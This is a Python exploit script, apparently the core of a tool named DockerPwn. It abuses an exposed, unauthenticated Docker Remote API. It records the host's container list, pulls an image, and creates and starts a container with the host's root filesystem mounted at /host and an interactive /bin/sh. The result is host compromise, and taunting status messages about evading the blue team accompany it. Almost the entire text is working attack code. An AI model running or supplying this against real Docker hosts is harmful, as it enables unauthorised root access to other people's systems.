#!/usr/bin/python3

import sys
import time
import http.client
import re
import json

def create(target, port, image):

    dockerConnection = http.client.HTTPConnection(target, port)

    headers = {
        'X-Requested-With': 'DockerPwn.py',
        'Content-Type': 'application/json',
    }
    
    dockerConnection.request('GET', '/containers/json')
    
    apiProbeResponse = dockerConnection.getresponse()


    if apiProbeResponse.status == 200:
        print('\n\n[+] Successfully probed the API. Writing out list of containers just in case there\'s something cool.\n')
        f = open("ContainerList.txt", "w+")
        f.write(str(apiProbeResponse.read()))
        f.close()
        dockerConnection.close()
    else:
        print('[-] API responded in unexpected way. Got ' + apiProbeResponse.status + ' ' + apiProbeResponse.reason)
        dockerConnection.close()
        sys.exit(0)

    try:

        print("[+] Downloading specified image for a lightweight pwning experience.\n")

        dockerConnection.request('POST', '/images/create?fromImage=' + image + '&tag=latest')
        imageStatus = dockerConnection.getresponse()

        if imageStatus.status == 200:
            print("[+] Image is downloading to the host. Hope we aren't setting off any alarms. Sleeping for a bit.\n")
            dockerConnection.close()
            timeout = time.time() + 60*4
            while time.time() < timeout:
	            cursorWait="\|/-\|/-"
	            for l in cursorWait:
		            sys.stdout.write(l)
		            sys.stdout.flush()
		            sys.stdout.write('\b')
		            time.sleep(0.2)
        else:
            print('[-] API refused to download image. Exiting.')
            dockerConnection.close()
            sys.exit(0)

        print("[+] Alright, creating container now...\n")

        containerJSON = json.dumps({
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": True,
            "AttachStdout": True,
            "AttachStderr": True,
            "Tty": True,
            "OpenStdin": True,
            "StdinOnce": True,
            "Entrypoint": "/bin/sh",
            "Image": "alpine",
            "Volumes": {"/host/": {}},
            "HostConfig": {"Binds": ["/:/host"]},
            "chroot" : "/host",
        })

        dockerConnection.request('POST', '/containers/create', containerJSON, headers)
        creationResponse = dockerConnection.getresponse()

        if creationResponse.status == 201:
    
            creationResponse = str(creationResponse.read())
            containerID = re.findall(r'[A-Fa-f0-9]{64}', creationResponse)
            print('[+] Success! Created container with root volume mounted. Got ID ' + containerID[0] + '!\n')
            dockerConnection.close()
        else:
            print('[-] API did not return a valid container ID, no container created.')
            dockerConnection.close()
            sys.exit(0)

        print('[+] Starting container ' + containerID[0] + '\n')
        dockerConnection.request('POST', '/containers/' + containerID[0] + '/start')
        startResponse = dockerConnection.getresponse()

        if startResponse.status == 204:
            print('[+] Container successfully started. Blue team will be with you shortly.\n')
            dockerConnection.close()
            return containerID
        else:
            print('[-] Container refused to start. Maybe try again. Insert shrug emoji here.\n')
            dockerConnection.close()
            sys.exit(0)

    except Exception as e:
        print(e)